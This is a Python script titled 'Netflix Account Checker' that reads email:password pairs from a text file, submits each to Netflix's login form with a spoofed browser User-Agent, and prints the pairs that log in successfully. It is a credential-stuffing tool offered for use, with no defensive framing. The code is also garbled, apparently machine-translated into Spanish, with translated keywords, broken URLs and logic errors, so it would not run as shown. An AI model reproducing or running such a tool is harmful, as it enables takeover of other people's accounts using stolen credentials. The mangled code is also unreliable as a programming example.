# ! / usr / bin / env python
# coding = utf-8

tratar :
	solicitudes de importación
	import sys, os
	importar os.path
	importar argparse
	de BeautifulSoup importamos BeautifulSoup as Soup

excepto  ImportError :
	imprimir  " Requisitos: 'solicitudes', 'BeautifulSoup' "

parser = argparse.ArgumentParser ( prog = ' Netflix Account Checker ' )
parser.add_argument ( " archivo " , ayuda = " Ubicación del txt " , tipo = str )
args = parser.parse_args ()

def  principal ( args ):
	
	if ( len (sys.argv) <  1 ) | ( len (sys.argv) >  2 ):
			imprimir  " Te faltan argumentos, usa -h para obtener ayuda "
			sys.exit ()

	credFile = args.file
	checkFile (credFile)
	líneas =  abierto (credFile, " r " )
	line =  list (credFile)
	
	para linea en lineas:
		email = line.split ( " : " ) [ 0 ]
		contraseña = line.split ( " : " ) [ 1 ]
		checkPassword (correo electrónico, contraseña)

def  checkPassword ( correo electrónico , contraseña ):
	s = peticiones.Sesión ()
	s.headers.update ({ ' User-Agent ' : ' Mozilla / 5.0 (X11; Ubuntu; Linux x86_64; rv: 46.0) Gecko / 20100101 Firefox / 46.0 ' })
	login = s.get ( " https://www.netflix.com/nl-en/Login " )
	sopa = Sopa (login.text)

	loginForm = soup.find ( ' formulario ' )
	authURL = loginForm.find ( ' input ' , { ' name ' : ' authURL ' }). get ( ' value ' )
	requestToNetflix = s.post ( " https://www.netflix.com:443/Login " , headers = { " Accept " : " text / html, application / xhtml + xml, application / xml; q = 0.9, * / *; q = 0.8 " , " Accept-Language " : " en-US, es; q = 0.5 " , " Accept-Encoding " : " gzip, deflate, br " , " Referer " : " https: // www. netflix.com/Login " ," Conexión" : " close " , " Content-Type " : " application / x-www-form-urlencoded " }, data = { " email " : (correo electrónico), " password " : (contraseña), " rememberMeCheckbox " : " true " , " flow " : " websiteSignUp " , " mode " : "inicio de sesión " , " acción" : " loginAction " , " withFields " : " email, password, rememberMe, nextPage " , " authURL " : (authURL), " nextPage " : " https://www.netflix.com/browse " })

	conectado = requestToNetflix.text.find ( ' name = "AuthURL" ' )

	si está registrado ==  - 1 :
		imprima " ¡Cuenta de trabajo! " , " Correo electrónico: " + correo electrónico + " Contraseña: " + contraseña
	 
def  checkFile ( credFile ):
	Si  no es os.path.exists (credFile):
		Imprimir  " Archivo no encontrado "
		sys.exit ()	

principal (args)
sys.exit ()
